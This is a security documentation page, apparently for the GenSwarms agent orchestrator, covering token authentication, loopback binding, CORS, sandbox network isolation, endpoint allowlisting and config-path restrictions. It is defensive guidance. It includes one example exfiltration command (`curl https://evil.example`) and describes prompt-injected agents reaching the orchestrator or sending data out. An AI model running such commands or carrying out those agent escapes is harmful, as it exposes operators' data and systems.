---
description: Securing a GenSwarms deployment — API authentication, network binding, CORS, agent network isolation, endpoint allowlisting, and the config-path restriction.
---

# Security

This page covers the operational controls you use to run GenSwarms safely. They
are all **off-by-default-safe**: a fresh server is never silently open to the
network, but you must opt in to the controls below before exposing it.

## API authentication

The REST API and the `swarm:{name}` WebSocket are gated by a fail-closed policy:

| `GENSWARMS_API_TOKEN` | Who may call the API |
|-----------------------|----------------------|
| **set** | every request must present `Authorization: Bearer <token>` (constant-time compared); WebSocket accepts it via `?token=` or the header. Missing/wrong → `401`. |
| **unset** | only loopback callers (`127.0.0.0/8`, `::1`) are allowed; remote callers are refused. |

So a server is never network-open without a token. **Set `GENSWARMS_API_TOKEN`
before binding to any non-local interface.** The CLI reads the same variable and
attaches the Bearer header automatically, so a token-protected server stays
transparent to `genswarms` commands.

Treat this token as full operator authority. In particular, a caller that may
add a tmux agent can select its client executable, argv, workspace, and unsafe
permission flags. Argv-only process launch prevents shell interpolation; it
does not turn an authorized executable choice into a sandbox.

!!! warning "Local agents share loopback"
    The token-less default protects against *remote* callers, but a `:bwrap`/
    `:local` agent runs on the same host and **is** a loopback caller. To stop a
    (potentially prompt-injected) local agent from reaching the orchestrator API,
    set `GENSWARMS_API_TOKEN` (it is not exposed to agents) and/or run agents
    with [network isolation](#agent-network-isolation).

## HTTP node-name policy

Node names currently become Erlang atoms, which are never garbage-collected.
HTTP creation therefore has two operator-selectable modes:

| Setting | Default | Effect |
|---------|---------|--------|
| `GENSWARMS_RESTRICTED_NAMES` | `false` | `true` permits only names already present in the server VM; `false` permits bounded dynamic creation |
| `GENSWARMS_MAX_DYNAMIC_NAMES` | `10000` | Maximum newly allocated HTTP node names over the VM's entire lifetime, shared across all swarms and callers |

Embedded applications can set `config :genswarms, restricted_names: true` or
`max_dynamic_names: 10000` instead. These settings belong to the operator, not
to request bodies or per-swarm `options`. Boolean settings accept `true`/`false`
or `1`/`0`; the budget must be a non-negative integer. Invalid settings reject
admission with `invalid_name_policy` instead of disabling protection.

Dynamic mode preserves creating swarms, agents, objects and replicas through
the API. Only explicit creation admits names. Agent output, messages, lookups,
topology edits, filters and arbitrary configuration keys never create atoms in
either mode. Names admitted through HTTP use the identifier syntax (letter,
then letters/digits/underscore/hyphen), at most 255 ASCII bytes.

The budget counts unique newly allocated names, not live agents. Deletion,
failed starts and process/application restarts do not refund reservations;
only a fresh Erlang VM resets the counter. A request interrupted during
allocation can consume its reservation even if not all names were created.
Reusing existing names is free and still works after exhaustion. Admission is
serialized and whole batches are checked before allocating, so concurrent
requests and repeated create/delete cycles cannot bypass the cap. Inline config
validation does not allocate or reserve names.

The effective budget cannot exceed one quarter of the VM atom-table limit,
even if configured higher. New allocations also stop when less than one quarter
of the table would remain free. Admission errors are `dynamic_name_limit_reached`
or `atom_table_capacity_low` (`400`); existing-node operations remain available.
This bounds HTTP-created names; it does not constrain trusted local Elixir code
or operator-controlled config files, which can still create atoms independently.

Restricted mode returns `restricted_names` (`400`) for fresh names. Existing
means an atom in **this server VM**, not necessarily an active node. Loading
configuration in a separate CLI process does not register its names in the API
server. An allowed operator-controlled `config_path` loaded by the server can
declare names. Choose this mode for deployments whose node names are predefined.

## Network binding

| Variable | Default | Effect |
|----------|---------|--------|
| `GENSWARMS_HTTP_IP` | `127.0.0.1` (loopback) | the address the production HTTP endpoint binds to |

The production server binds to **loopback by default**. To expose it (e.g. a
container behind a proxy) set `GENSWARMS_HTTP_IP=0.0.0.0` (or `::`, or a specific
address) — and set an API token first.

## CORS

| Variable | Default | Effect |
|----------|---------|--------|
| `GENSWARMS_CORS_ORIGINS` | local dev origins (`localhost`/`127.0.0.1`/`[::1]`) | which browser origins may call the API |

Unset → local dev origins only. `*` → any origin (only sensible behind a token).
Otherwise a comma-separated exact-match allowlist.

## Agent network isolation

Set `network: :isolated` in a Docker or bwrap agent's `config` when the agent ingests
**untrusted/external content** (web pages, third-party files, messages from
outside users) — anything that can prompt-inject it:

```elixir
%{name: :researcher, backend: :bwrap,            config: %{network: :isolated}}
%{name: :scraper,    backend: {:docker, "web"}, config: %{network: :isolated}}
```

An isolated agent gets **no network**; its only egress is a forwarder pinned to
the LLM endpoint. Inside the sandbox, `curl http://localhost:4000` (the
orchestrator) and `curl https://evil.example` (exfiltration) both fail — only the
LLM is reachable, and the destination is fixed by the host, not the agent. This
prevents an injected agent from escalating into the swarm or exfiltrating data.

Requires `socat` on the host. The default (`network: :open`) is unchanged.
Apple `container` agents reject `:isolated` and fail closed because the current
CLI does not expose equivalent egress-forwarding semantics. See [Backends](backends.md)
for the per-backend mechanism.

The tmux backend can put each Codex/Claude/OpenCode pane command inside its own
Docker container or bwrap sandbox with `runner: :docker` / `runner: :bwrap`.
tmux remains on the trusted host; only the coding client and its children enter
the per-agent boundary. Its workspace is mounted read/write, its client home is
a private `state_dir` mounted at `/root`, skills and any injected Nix closure
are read-only, and the tmux socket is not exposed.

Interactive TUI runners deliberately reject `network: :isolated`. The existing
LLM-only forwarder translates the subzeroclaw protocol and cannot safely infer
or constrain every native coding client's endpoints. Use `network: :none` for
a complete cutoff (which also prevents cloud-model calls), or `:open`/a named
Docker network with the corresponding trust boundary. This fails closed instead
of making an LLM-only egress promise that the runtime cannot enforce.

Filesystem/process isolation is still useful with open networking, but it does
not make prompt-injected content safe from data exfiltration. Two agents with
different trust levels should have distinct workspaces, state directories, and
credentials. Extra read/write binds explicitly expand the boundary.

`client_source: :runtime` trusts the selected image/base to provide the client.
`client_source: :host_nix` mounts only the chosen Nix executable closure
read-only; it does not expose arbitrary host binaries or host configuration.
The state directory can contain Codex/Claude/OpenCode authentication material,
so it is created mode 0700 and must be protected like a credential directory.
Environment values are omitted from session metadata and Docker ownership
labels. Docker uses a short-lived mode-0600 env file; bwrap stores a mode-0600
file below the private `state_dir` and enters through a constant launcher.
Neither runner places the values in host-visible command-line arguments.

Long bwrap/Nix launch vectors are also kept out of the tmux control command.
They are stored in a mode-0600 NUL-delimited manifest and replayed by GNU
`xargs` with an exact argument count and fail-on-size-overflow behavior. The
manifest is argv data, not a host-shell script; hostile-looking paths or
arguments cannot become shell syntax.

The durable turn reader treats completion artifacts as untrusted filesystem
input: `done.json` and `reply.md` must be regular files, the opened descriptor
must still match the file observed by `lstat`, and reads are size-bounded.
Symlinked, replaced, oversized, or malformed receipts move the session to
`needs_attention` instead of being followed/read by the host.

Dangerous Codex/Claude bypass modes are never enabled just because an outer
runner exists. They remain an explicit operator decision. If nested client
sandboxing is incompatible with the outer boundary, only enable a bypass after
the Docker/bwrap mounts, network, credentials, and resource limits are strong
enough for that agent's input.

### Endpoint allowlist

A per-agent `:endpoint` is honored as the isolated forwarder's destination only
if its host is allowlisted:

| Variable | Effect |
|----------|--------|
| `GENSWARMS_ALLOWED_ENDPOINTS` | comma-separated hosts a per-agent endpoint may point at (in addition to the server's own endpoint host) |

The operator's env/default endpoint is always trusted. An isolated agent whose
endpoint is not allowed **fails to start** rather than forwarding to an arbitrary
host.

## API config-path restriction

`POST /api/swarms {"config_path": "..."}` and
`POST /api/config/validate {"config_path": "..."}` load a server-side file.
The path is restricted to a directory:

| Variable | Default | Effect |
|----------|---------|--------|
| `GENSWARMS_SWARM_CONFIG_DIR` | the server's working directory | directory that request-supplied `config_path` values must stay within |

Paths that escape (absolute or `..` traversal) are rejected with `400`. The CLI
is operator-run and unrestricted.

This directory is a trust boundary: keep its files and symlink targets under
operator control, outside agent-writable workspaces. The path guard checks
lexical containment; it does not resolve symlinks. Local files may declare new
node names and executable `.exs` configuration independently of the HTTP
node-name policy above.

## Behavior changes to be aware of

If you are upgrading, note these defaults:

- **HTTP binds to loopback** in production by default (was all-interfaces). Set
  `GENSWARMS_HTTP_IP` for wider exposure.
- **SSH host-key verification is on** by default — an unknown/changed remote host
  key aborts the connection (MITM protection). Populate `known_hosts`, or opt out
  per-backend with `silently_accept_hosts: true`.
- **Swarm definitions and dynamic mutations are validated by the
  [IR gate](intermediate-representation.md#the-default-control-plane-gate)** — an
  invalid config is refused at start, and `add_agent`/`scale` are bounded by the
  per-swarm agent cap.

## Environment variables

| Variable | Purpose |
|----------|---------|
| `GENSWARMS_API_TOKEN` | API Bearer token (unset → loopback-only) |
| `GENSWARMS_HTTP_IP` | production bind address (default loopback) |
| `GENSWARMS_CORS_ORIGINS` | CORS origin allowlist |
| `GENSWARMS_ALLOWED_ENDPOINTS` | per-agent endpoint host allowlist (isolation) |
| `GENSWARMS_SWARM_CONFIG_DIR` | allowed directory for API `config_path` |
